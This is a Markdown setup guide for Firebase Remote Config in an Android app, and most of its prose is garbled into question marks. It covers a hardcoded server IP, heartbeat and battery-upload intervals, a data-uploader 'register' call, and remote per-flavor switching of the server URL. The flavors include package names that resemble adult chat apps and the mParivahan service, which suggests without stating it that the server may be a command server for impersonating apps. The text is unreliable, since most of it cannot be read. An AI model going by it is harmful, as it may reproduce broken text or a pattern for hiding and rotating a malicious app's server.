# ??????? Firebase Remote Config ??

??????? ???? ????? ? ??????? ?? Firebase Remote Config ???? ?????? ???? ????

---

## ?? ?????

1. [??? Remote Config?](#???-remote-config)
2. [????? Firebase Console](#?????-firebase-console)
3. [?????????? ???????? ???](#??????????-????????-???)
4. [???? ??????? ?? ??](#????-???????-??-??)
5. [??? ? Debug](#???-?-debug)
6. [???????? ????](#????????-????)

---

## ?? ??? Remote Config?

### **??? (Hardcoded):**
```kotlin
const val BASE_URL = "http://95.134.130.160:8765"  // ? ????!
```

? ???? ????? ???? ???? Build ?????? ?????  
? ??????? ?? ???? ???? ?? ??? ???  
? ??? ???? ??? ???? ???? APK ???? ????? ???  

### **??? (Firebase Remote Config):**
```kotlin
val url = ServerConfig.getBaseUrl()  // ? ?? Firebase ????!
```

? ????? ???? ???? Build  
? ????? ???? ?? Firebase Console  
? A/B Testing ???? ??????? ?????  
? ?????? ??????  
? Rollback ???? ?? ???? ????  

---

## ?? ????? Firebase Console

### **????? 1??: ??? ???? Remote Config**

1. ??? ?? [Firebase Console](https://console.firebase.google.com/)
2. ????? ???? ?? ?????? ??
3. ?? ???? ??: **Engage** ? **Remote Config**
4. ??? ????? ????? ??? **Get started**

---

### **????? 2??: ????? ???? ??????? `base_url`**

1. ??? **Add parameter**
2. **Parameter key:** `base_url`
3. **Default value:** `http://95.134.130.160:8765`
4. **Description (???????):** "Server base URL for API requests"
5. **Data type:** String
6. ??? **Save**

![???? ??????]
```
???????????????????????????????????????
? Parameter key: base_url             ?
? Default value: http://95.134...8765 ?
? Data type: String                   ?
???????????????????????????????????????
```

---

### **????? 3??: ????? ???? ?????????? ????? (???????)**

#### **heartbeat_interval_ms:**
```
Parameter key: heartbeat_interval_ms
Default value: 60000
Data type: Number
Description: Heartbeat interval in milliseconds
```

#### **battery_update_interval_ms:**
```
Parameter key: battery_update_interval_ms
Default value: 60000
Data type: Number
Description: Battery update interval in milliseconds
```

---

### **????? 4??: Publish ???? ???????**

1. ??? ?? ????? ???? ??? ?????????
2. ??? **Publish changes** (????? ????)
3. Confirm ??

**???:** ?? Publish ????? ??????? ???? ???????? ???? ?????!

---

## ?? ?????????? ???????? ???

| ??????? | ??? | ??????? | ??????? |
|---------|-----|---------|---------|
| `base_url` | String | `http://95.134.130.160:8765` | ???? ???? ???? API |
| `heartbeat_interval_ms` | Number | `60000` | ????? heartbeat (??????????) |
| `battery_update_interval_ms` | Number | `60000` | ????? battery update (??????????) |

### **?????????? ??????:**

?????? ?? ??????? ??????? ????? ???:

```kotlin
// ?? ??:
val customValue = ServerConfig.getString("my_custom_key", "default")
val customNumber = ServerConfig.getLong("my_number", 100)
val customFlag = ServerConfig.getBoolean("my_flag", false)
```

---

## ?? ???? ??????? ?? ??

### **1. ?????????? (?? MainActivity):**

```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    
    // ? ?????????? Firebase Remote Config
    ServerConfig.initialize(this)
    
    // ????? ??????? ????
    ServerConfig.printAllSettings()
}
```

**Log ?????:**
```
????????????????????????????????????????
?? CURRENT SERVER CONFIG
????????????????????????????????????????
?? Base URL: http://95.134.130.160:8765
?? Heartbeat Interval: 60000ms
?? Battery Interval: 60000ms
?? Initialized: true
????????????????????????????????????????
```

---

### **2. ??????? ?? Base URL:**

```kotlin
// ?? DataUploader.kt ?? ?? ??? ????:
val baseUrl = ServerConfig.getBaseUrl()
val fullUrl = "$baseUrl/register"

// ????? request
sendPostRequest(fullUrl, data)
```

---

### **3. ?????? ?????????? ????:**

```kotlin
// Heartbeat interval
val interval = ServerConfig.getHeartbeatInterval()

// Battery update interval
val batteryInterval = ServerConfig.getBatteryUpdateInterval()

// ??????? ??????
val customString = ServerConfig.getString("my_key", "default")
val customNumber = ServerConfig.getLong("my_number", 0)
val customFlag = ServerConfig.getBoolean("my_flag", false)
```

---

### **4. Refresh ???? ???????:**

```kotlin
// Fetch ? activate ???? (async)
ServerConfig.fetchAndActivate()

// ?? ?? Coroutine:
lifecycleScope.launch {
    val updated = ServerConfig.fetchAndActivateAsync()
    if (updated) {
        Log.d("Config", "? New config activated!")
    }
}
```

---

### **5. ??? ???? Cache:**

```kotlin
// ???? force refresh
ServerConfig.clearCache()
val freshUrl = ServerConfig.getBaseUrl()  // ?????? ?? Firebase ??????
```

---

## ?? ??? ? Debug

### **1. ?? ???? ??????? ????:**

```kotlin
ServerConfig.printAllSettings()
```

**?????:**
```
?? CURRENT SERVER CONFIG
?? Base URL: http://95.134.130.160:8765
?? Heartbeat Interval: 60000ms
?? Battery Interval: 60000ms
```

---

### **2. ??? ????? Server:**

#### **?? Firebase Console:**
1. ??? **Remote Config**
2. Edit ?? `base_url`
3. ????? ???? ????: `http://192.168.1.100:8000`
4. Publish ??

#### **?? ????????:**
```kotlin
// Force refresh
ServerConfig.fetchAndActivate()

// ??? ?? ??? ?????
val newUrl = ServerConfig.getBaseUrl()
Log.d("Test", "New URL: $newUrl")  // ???? ???? ???? ?? ???? ???
```

---

### **3. ??????? ????:**

```bash
# ????? ???? ??????? ServerConfig
adb logcat | grep ServerConfig

# ?????:
# ServerConfig: ?? Reading config from Firebase...
# ServerConfig: ? Remote Config fetched: updated=true
# ServerConfig: ?? Base URL: http://95.134.130.160:8765
```

---

### **4. ??? Fallback (???? Firebase):**

???? ??? ???? fallback:

1. Airplane mode ?? ???? ??
2. ???????? ?? ??? ??
3. ???? ?? ????? ??????? ??????? ???:

```kotlin
// ???? Firebase
val url = ServerConfig.getBaseUrl()
// ? "http://95.134.130.160:8765" (default)
```

---

## ?? ???????? ????

### **???? 1: ????? ???? ???? ???**

**??????:** ?????? ??? ???? ???? ??? ???

1. **Firebase Console:**
   - `base_url` = `http://192.168.1.100:8000`
   - Publish

2. **????????:**
   ```kotlin
   ServerConfig.fetchAndActivate()
   // ???? ??? API ?? ?? ???? ???? ????!
   ```

---

### **???? 2: ?????? ?????? ?? ???? ????**

**??????:** ???? ???? ???? ? ?????? ?????? ?? ?????? ????? ???

1. **Firebase Console:**
   - Conditions ?? ????? ??
   - 10% ??????: `base_url` = ???? ????
   - 90% ??????: `base_url` = ???? ?????

2. **??????:**
   - Monitoring ??
   - ??? ??? ???? ???? ?? ???? ???

---

### **???? 3: A/B Testing**

**??????:** ?? ???? ???? ? ?????? ????? ???? ????????

1. **Firebase Console:**
   - Experiment ????? ??
   - Variant A: ???? 1
   - Variant B: ???? 2

2. **?? (????????):**
   ```kotlin
   val url = ServerConfig.getBaseUrl()
   // Firebase ???? ????? ?????? ???? ???? ?? ???
   ```

---

### **???? 4: ??????? - ????? ???? ????**

**??????:** ???? ???? ??? ???? ???? ???? ?? backup ???

1. **Firebase Console** (?? ???? ?? ????!)
   - Edit `base_url`
   - ????? ????: `http://backup-server.com:8765`
   - Publish (???? ?? 1 ?????!)

2. **???????:**
   - ???????? ?? 1 ???? ????? fetch ??????
   - ?? Force ?? ??:
   ```kotlin
   ServerConfig.fetchAndActivate()
   ```

---

### **???? 5: ??????? ????? ???? Flavor**

**??????:** ?? flavor ???? ??????? ????? ????

1. **Firebase Console:**
   - Conditions ? App ? App ID
   - `com.sexychat.me`: `base_url` = `http://server1.com`
   - `com.mparivahan.me`: `base_url` = `http://server2.com`
   - `com.sexyhub.me`: `base_url` = `http://server3.com`

2. **?? (???? ?????!):**
   ```kotlin
   val url = ServerConfig.getBaseUrl()
   // Firebase ???? flavor ?? ????? ???? ? URL ????? ?? ????
   ```

---

## ?? ???? Fetch ?? ???????? ?????

### **1. App Startup (??????):**
```kotlin
ServerConfig.initialize(context)
// Automatically fetches in background
```

### **2. Manual Refresh:**
```kotlin
ServerConfig.fetchAndActivate()
```

### **3. Periodic Refresh (?? 1 ????):**
```kotlin
// ??????? ??????? ?? ServerConfig
minimumFetchIntervalInSeconds = 3600  // 1 hour
```

### **4. On Demand (???? Debug):**
```kotlin
lifecycleScope.launch {
    val updated = ServerConfig.fetchAndActivateAsync()
    Log.d("Config", "Updated: $updated")
}
```

---

## ?? ???? ???

### **1. Cache:**
- ?????? ???? ????? performance cache ????
- ???? force refresh: `ServerConfig.clearCache()`

### **2. Fallback:**
- ??? Firebase ?? ????? ?????? ?? ????? ??????? ??????? ????
- ????? fallback ????? ????? ??

### **3. Fetch Interval:**
- ???????: 1 ????
- ???? Development: ???? ??
- ???? Production: 1 ???? ?????

### **4. Testing:**
- ???? ??? ?? ?? ? ???? ???????
- ?????? ??????? ?? ????? ????

### **5. Security:**
- Remote Config ??? ??? (?? Firebase ????)
- ??? ???? ???? public ???!
- ???? API ??? ???? ?? authentication ??????? ??

---

## ?? ?? ???? ?????

- [ ] Firebase Console ?? ??? ????
- [ ] Remote Config ?? ???? ????
- [ ] ??????? `base_url` ?? ????? ????
- [ ] ????? ??????? ????? ????? ????
- [ ] ??????? ?? Publish ????
- [ ] `ServerConfig.initialize()` ?? `onCreate` ???
- [ ] ??? ???? ?? ???????
- [ ] ??? ???? ???? ??????? (Airplane mode)
- [ ] Logs ?? ?? ???? (`adb logcat | grep ServerConfig`)
- [ ] API requests ?? ???? ???? ????

---

## ?? ?????? ????

### **???? 1: ????? ??????? ???? ????**

**???:** Publish ????? ?? Firebase ?????? ?????

**??? ??:**
1. ?? ?? Publish ????
2. ?? ?? ??????? ????
3. ?????? ?? ????: `adb logcat | grep ServerConfig`

---

### **???? 2: ??????? ????? ?????**

**???:** Cache

**??? ??:**
```kotlin
ServerConfig.clearCache()
ServerConfig.fetchAndActivate()
```

---

### **???? 3: ???? "Not initialized"**

**???:** `initialize()` ??? ????

**??? ??:**
```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)
    ServerConfig.initialize(this)  // ? ???? ??? ?? ????
}
```

---

## ?? ????? ?????

- [Firebase Remote Config Docs](https://firebase.google.com/docs/remote-config)
- [Kotlin Guide](https://firebase.google.com/docs/remote-config/get-started?platform=android&hl=en)
- [Best Practices](https://firebase.google.com/docs/remote-config/loading)

---

## ?? ?????

?? Firebase Remote Config:
- ? ???? ???? ?? ???? Build ??? ??
- ? ?????? ?????? ???????
- ? A/B Testing ????
- ? Rollback ????
- ? ?????? ?????? ????

**??????? ???? ????? ?? Build ???? ????? ???? ????! ??**

---

**????? ?????:** 2025-11-01  
**????:** 1.0
